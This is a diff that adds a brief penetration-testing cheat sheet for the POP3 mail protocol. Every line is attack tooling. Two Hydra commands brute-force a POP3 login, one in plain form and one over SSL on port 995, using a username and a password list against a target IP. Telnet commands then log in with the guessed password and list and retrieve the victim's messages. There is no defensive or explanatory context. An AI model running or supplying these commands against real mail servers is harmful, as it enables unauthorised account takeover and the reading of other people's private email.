@@ -1,0 +1,13 @@
+# POP3
+# Brute force
+hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
+hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
+
+# Read mail
+telnet <IP> 110
+
+USER <USER>
+PASS <PASSWORD>
+LIST
+RETR <MAIL_NUMBER>
+QUIT
